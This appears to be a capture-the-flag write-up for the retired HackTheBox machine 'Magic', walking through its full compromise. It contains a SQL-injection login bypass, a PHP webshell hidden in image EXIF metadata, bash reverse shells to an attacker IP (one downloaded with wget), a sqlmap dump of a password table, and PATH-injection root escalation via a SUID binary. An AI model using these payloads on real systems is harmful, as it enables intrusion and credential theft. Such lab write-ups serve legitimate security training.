---
title: HackTheBox-Magic
author: a3nk17
date: 2020-08-24 
excerpt: Magic was a medium linux machine that involved sql injection to get access to an image upload feature. We upload our malicious image to get a shell on the target system. Enumerating for credentials exposes mysql creds that we use to dump the password for the user. Root was explpoitation of fdisk and sysinfo to get a root reverse shell.
thumbnail: /assets/img/posts/magic/info.png
categories: [HackTheBox, Retired]
tags: [HTB, sql, Linux, web, SQLi, SQLMap, image upload, php injection, path injection,]
---

![info](/assets/img/posts/magic/info.png)



### Synopsis


The box starts with `web-enumeration`, where we have to bypass a login with `SQL-injection` . After that we find a image upload functionality. Using the metadata of the image, we are able to smuggle php code that gets interpreted by the server upon access. With this we get code-execution as www-data.

Going back to the SQL-injection we use SQLMap to dump the `database` and get credentials. Using the creds we can get access as user and read user.txt

To get root we have to abuse `path injection` in a `SUID-binary`, which gets us a `reverse-shell` as root.


[Magic](https://www.hackthebox.eu/home/machines/profile/241) is a medium linux box by [TRX](https://www.hackthebox.eu/home/users/profile/31190).

# Information Gathering

## Nmap

We begin our enumeration with a `nmap scan` for open ports.

```bash
root@kali:~# nmap --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.181

Nmap scan report for 10.10.10.185
Host is up, received user-set (0.035s latency).
Scanned at 2020-05-04 16:47:40 CEST for 501s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio

Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/4%OT=22%CT=1%CU=42685%PV=Y%DS=2%DC=T%G=Y%TM=5EB02D01
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 43.033 days (since Sun Mar 22 15:08:12 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   33.87 ms 10.10.14.1
2   34.02 ms 10.10.10.185

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May  4 16:56:01 2020 -- 1 IP address (1 host up) scanned in 501.17 seconds
```

# Enumeration
The open ports shown are `22` and `80`. `SSH` usually is not that interesting, so let’s begin with http.

## HTTP - Port 80
Going to http://10.10.10.185 a website with a couple of images is shown.

![Main webpage](/assets/img/posts/magic/webpage-index.png)

The main page does not look interesting at first glance. After pressing the login link we get redirected to the `login page`.

### Bypassing the login

![Login page](/assets/img/posts/magic/webpage-login.png)

After testing some default logins like `admin:admin`, the next step would be to try `SQL-Injection`.

![Login bypass with SQLi](/assets/img/posts/magic/sqli-login.png)

A simple SQL-injection like `admin'#` can bypass the login.

After successful login, we get redirected to upload.php.

![Image upload](/assets/img/posts/magic/webpage-img-upload.png)

### Image upload to RCE

Let us try to upload a php file as an image and get code execution this way.
```bash
root@kali:~# cat exploit.gif.php
GIF8 <?php system($_GET['cmd']);?>
root@silence:~# file exploit.gif.php
exploit.gif.php: GIF image data 28735 x 28776
```
Using `GIF8`, which are the magic bytes for a GIF image, we can mask the php file as an image.

![GIF upload not allowed](/assets/img/posts/magic/img-notallowed.png)

Uploading the `GIF` does not seem to be allowed.

We can use exiftool to add `PHP-code` as a comment to a valid image.

```bash
root@kali:~# exiftool -Comment='<?php echo "<pre>"; system($_REQUEST['cmd']); ?>' chronos.php.jpg
    1 image files updated
root@silence:~# exiftool chronos.php.jpg
ExifTool Version Number         : 11.80
File Name                       : chronos.php.jpg
Directory                       : .
File Size                       : 115 kB
File Modification Date/Time     : 2020:04:27 19:23:39+02:00
File Access Date/Time           : 2020:04:27 19:23:42+02:00
File Permissions                : rw-rw-rw-
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Comment                         : <?php echo "<pre>"; system($_REQUEST[cmd]); ?>
```

![Uploading image](/assets/img/posts/magic/img-uploading.png)

Now let us upload this image and check if code execution is now possible.

![Image uploaded](/assets/img/posts/magic/img-uploaded.png)

The image has been uploaded successfully. Let us try to find the upload location. The images on the main page hint that the file is located at http://10.10.10.185/images/uploads/.

![Viewing image](/assets/img/posts/magic/img-view.png)

When accessing the image we get printed a lot of blob data. This is a good sign.
Now we can check if we have code execution by supplying the a command via the `cmd` parameter to the image.

![Checking RCE](/assets/img/posts/magic/rce-check.png)

Supplying `ls -alh` as the value for cmd, we can list the contents of uploads directory.

### Getting www-data shell
First we have to create a simple bash-reverse shell script that will be hosted using a python webserver.
```bash
root@kali~# cat s.sh
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'
```
The bash `reverse-shell` that will be hosted.

Hosting the reverse-shell using `python3 http.server` we can download the payload from the server with http://10.10.10.185/images/uploads/chronos.php.jpg?cmd=wget+10.10.14.11/s.sh.
```bash
root@kali:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.185 - - [18/Apr/2020 23:35:52] "GET /s.sh HTTP/1.1" 200 -
```
Using http://10.10.10.185/images/uploads/chronos.php.jpg?cmd=bash+s.sh the reverse-shell is executed and returned to the nc listener.
```bash
root@kali:~# nc -lvnp 443
Ncat: Connection from 10.10.10.185:53734.
www-data@ubuntu:/var/www/Magic/images/uploads$
```

# Privesc

Now that we got our `initial shell`, let us enumerate the system to find a way to escalate our `privileges` to user.

## Privesc to user

### Enumeration as www-data

```bash
theseus@ubuntu:/var/www/Magic$ cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic';
    private static $dbHost = 'localhost';
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
```
After this we enumerate files on the box. We come accross a file called `db.php5` which when reading it reveals credentials for the `mysql` database.

We will use this to get our user credentials.

```php
pwd 
/var/www/Magic
cat db.php5   
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
```

We find a database file in /var/www/Magic


```bash
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
```
In order to try the password and `su` to `theseus`, the shell has to be upgraded first.
```bash
www-data@ubuntu:/var/www/Magic/images/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/Magic/images/uploads$ ^Z
[1]+  Stopped                 nc -lvnp 443
root@silence:~# stty raw -echo
root@silence:~# nc -lvnp 443

www-data@ubuntu:/var/www/Magic/images/uploads$
```
With the `upgraded shell` su can now be used.

```bash
theseus@ubuntu:/var/www/Magic$ su theseus
Password: iamkingtheseus
su: Authentication failure
```
Seems like the `password` is not `correct`. Let us enumerate a bit more.

### Getting passwords from MySQL using SQL-Injection
With the `SQL-Injection` still in mind, we can try to use sqlmap to leak further information from the database.

Capturing the `login request` and saving it to a file, in order to ease the use of sqlmap.
```bash
root@kali:~# cat login.req
POST /login.php HTTP/1.1
Host: 10.10.10.185
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.185/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Connection: close
Upgrade-Insecure-Requests: 1

username=*&password=*
```
Now we can use the request with `SQLMap`.
```bash
root@kali:~# sqlmap -r login.req --risk 3 --level 5

[19:51:08] [INFO] (custom) POST parameter '#1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause' inject
able (with --code=302)
[19:51:10] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'

sqlmap identified the following injection point(s) with a total of 612 HTTP(s) requests:

Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-1771' OR 1469=1469-- rRkM&password=

```
Now with the SQL injection `confirmed`, we should further enumerate the database.

```bash
root@silence:~# sqlmap -r login.req --risk 3 --level 5 –tables
Database: Magic
[1 table]
+---------------------------------------+
| login                                 |
+---------------------------------------+
```
The login table in the Magic database seems the most `interesting`. Let us dump this `table` and see if we can get any new passwords.

```bash
root@kali:~# sqlmap -r login.req --risk 3 --level 5 -T login --dump

Database: Magic
Table: login
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | Th3s3usW4sK1ng | admin    |
+----+----------------+----------+
```
With the `newly` found password, we can try `su` once again.
```bash
www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus
Password: Th3s3usW4sK1ng
theseus@ubuntu:/var/www/Magic/images/uploads$
```
The found password works with `su`. Now we have user and can read `user.txt`.
```bash
theseus@ubuntu:/var/www/Magic/images/uploads$ cat /home/theseus/user.txt
83c7e***************************
```

## Privesc to root

Now that we have a shell as `theseus`, let us enumerate the system to find a way to escalate our privileges to root.

### Enumeration as theseus
Let us check all SUID binaries on the system.
```bash
theseus@ubuntu:~$ find / -executable -perm -4000 2>/dev/null
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
```
`Sysinfo` does not seem like a default binary. Let us further enumerate this binary.

```bash
theseus@ubuntu:~$ ltrace sysinfo
...
setuid(0)
setgid(0)
...
popen("lshw -short", "r")
...
popen("fdisk -l", "r")
...
popen("cat /proc/cpuinfo", "r")
...
popen("free -h", "r")
...
```
All these popen functions call programs without absolute paths, which means the `sysinfo binary` is susceptible to `path-injection`.

### Exploiting path injection
The first step of exploiting this `vulnerability` is to choose one of the called binaries and create a malicious file with the same name in a location we can write to. I have chosen `lshw`, as it is the first binary that is called. Every other binary would work as well.
```bash
theseus@ubuntu:/dev/shm$ cat lshw
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'
theseus@ubuntu:/dev/shm$ chmod +x lshw
```
The next step is to change the environment variable `PATH`.
```bash
theseus@ubuntu:/dev/shm$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
The original unchanged `PATH`.

```bash
theseus@ubuntu:/dev/shm$ export PATH=$(pwd):$PATH
theseus@ubuntu:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
Now we add `/dev/shm` to the beginning of the current `PATH`. Whenever a binary is now called using relative paths, the system checks all these folders for the binary. The first match will be used.

With the `nc listener` running in the background the binary can now be executed.

```bash
theseus@ubuntu:/dev/shm$ sysinfo
====================Hardware Info====================
```
Upon running `lshw`, the malicious `lshw` version will be run and the reverse-shell is triggered.

```bash
root@kali:~# nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.185.
Ncat: Connection from 10.10.10.185:36898.
root@ubuntu:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
```
We get a `reverse-shell` as the user root returned and we can now read `root.txt`.
```bash
root@ubuntu:/root# cat root.txt
9e707***************************
```

![info](/assets/img/posts/magic/final.png)
